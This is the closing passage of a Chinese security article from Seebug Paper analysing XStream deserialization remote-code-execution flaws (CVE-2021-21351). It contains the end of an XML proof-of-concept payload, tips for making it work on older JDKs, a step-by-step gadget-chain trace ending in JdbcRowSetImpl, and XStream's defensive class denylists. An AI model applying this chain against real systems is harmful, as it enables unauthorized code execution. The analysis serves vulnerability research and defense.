    </value>
  </javax.naming.ldap.Rdn_-RdnEntry>
</sorted-set>
```

这次用到的gadget入口点为javax.naming.ldap.Rdn$RdnEntry，在使用该POC之前仍然有一个点是需要注意的，\ <__overrideDefaultParser>这个标签在低版本的jdk中是没有的，需要进行更换。

![](https://images.seebug.org/content/images/2021/04/06/1617677146000-37.png-w331s)

更换成以下标签。

![](https://images.seebug.org/content/images/2021/04/06/1617677146000-38.png-w331s)

接下来就用jdk1.8.20为例，来进行分析。首先在POC中我们可以直观的看到，有两个Rdn$RdnEntry的序列化数据，最外层的触发点是Rdn$RdnEntry.compareTo方法，该方法是对比两个Rdn$RdnEntry的value属性是否相同。

![](https://images.seebug.org/content/images/2021/04/06/1617677146000-39.png-w331s)

当前对象的value属性是一个Xstring对象，在POC中的这个位置。

![](https://images.seebug.org/content/images/2021/04/06/1617677146000-40.png-w331s)

所以跟进Xstring.equals方法，该方法中需要注意的是调用了obj2 也就是传入的XRTreeFrag.toString方法，跟进该方法

![](https://images.seebug.org/content/images/2021/04/06/1617677146000-41.png-w331s)

经过一次嵌套调用后，来到XRTreeFrag.str方法中 这里调用了之前就封装在POC中的SAX2DTM对象，如下图所示

![](https://images.seebug.org/content/images/2021/04/06/1617677146000-42.png-w331s)

![](https://images.seebug.org/content/images/2021/04/06/1617677147000-43.png-w331s)

跟入SAX2DTM.getStringValue方法，经过两次嵌套调用后，来到了SAX2DTM.nextNode方法中，该方法中需要注意的是调用了m\_incrementalSAXSource属性也就是POC中封装好的IncrementalSAXSource\_Xerces对象的deliverMoreNodes方法。

![](https://images.seebug.org/content/images/2021/04/06/1617677148000-44.png-w331s)

继续向下执行，最终会执行到IncrementalSAXSource_Xerces.parseSome方法，该方法会通过反射调用JdbcRowSetImpl.setAutoCommit方法。

![](https://images.seebug.org/content/images/2021/04/06/1617677148000-45.png-w331s)

接下来的流程就还是JdbcRowSetImpl的老一套了，就不再深入说明了。至此CVE-2021-21351分析完毕

6\. 总结
------

此次爆出的几个反序列化RCE漏洞，总结下漏洞的触发点分别为“java.util.PriorityQueue.compare()“、“javax.naming.ldap.Rdn$RdnEntry.compareTo()”、而Xstream的防护方法也是很直白是通过黑名单的形式来进行防护。

下面是1.4.15版本的黑名单

```
protected void setupSecurity() {
    if (securityMapper == null) {
        return;
    }

    addPermission(AnyTypePermission.ANY);
    denyTypes(new String[]{
        "java.beans.EventHandler",        "java.lang.ProcessBuilder",        "javax.imageio.ImageIO$ContainsFilter",        "jdk.nashorn.internal.objects.NativeString" });
    denyTypesByRegExp(new Pattern[]{LAZY_ITERATORS, JAVAX_CRYPTO, JAXWS_FILE_STREAM});
    allowTypeHierarchy(Exception.class);
    securityInitialized = false;
}
```

然后是1.4.16版本的黑名单

```
 private static final String ANNOTATION_MAPPER_TYPE = "com.thoughtworks.xstream.mapper.AnnotationMapper";
    private static final Pattern IGNORE_ALL = Pattern.compile(".*");
    private static final Pattern GETTER_SETTER_REFLECTION = Pattern.compile(".*\\$GetterSetterReflection");
    private static final Pattern PRIVILEGED_GETTER = Pattern.compile(".*\\$PrivilegedGetter");
    private static final Pattern LAZY_ITERATORS = Pattern.compile(".*\\$LazyIterator");
    private static final Pattern JAXWS_ITERATORS = Pattern.compile(".*\\$ServiceNameIterator");
    private static final Pattern JAVAFX_OBSERVABLE_LIST__ = Pattern.compile("javafx\\.collections\\.ObservableList\\$.*");
    private static final Pattern JAVAX_CRYPTO = Pattern.compile("javax\\.crypto\\..*");
    private static final Pattern BCEL_CL = Pattern.compile(".*\\.bcel\\..*\\.util\\.ClassLoader");

......

protected void setupSecurity() {
    if (this.securityMapper != null) {
        this.addPermission(AnyTypePermission.ANY);
        this.denyTypes(new String[]{"java.beans.EventHandler", "java.lang.ProcessBuilder", "javax.imageio.ImageIO$ContainsFilter", "jdk.nashorn.internal.objects.NativeString", "com.sun.corba.se.impl.activation.ServerTableEntry", "com.sun.tools.javac.processing.JavacProcessingEnvironment$NameProcessIterator", "sun.awt.datatransfer.DataTransferer$IndexOrderComparator", "sun.swing.SwingLazyValue"});
        this.denyTypesByRegExp(new Pattern[]{LAZY_ITERATORS, GETTER_SETTER_REFLECTION, PRIVILEGED_GETTER, JAVAX_CRYPTO, JAXWS_ITERATORS, JAVAFX_OBSERVABLE_LIST__, BCEL_CL});
        this.denyTypeHierarchy(InputStream.class);
        this.denyTypeHierarchyDynamically("java.nio.channels.Channel");
        this.denyTypeHierarchyDynamically("javax.activation.DataSource");
        this.denyTypeHierarchyDynamically("javax.sql.rowset.BaseRowSet");
        this.allowTypeHierarchy(Exception.class);
        this.securityInitialized = false;
    }
}
```

* * *

![](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
 本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：[https://paper.seebug.org/1543/](https://paper.seebug.org/1543/)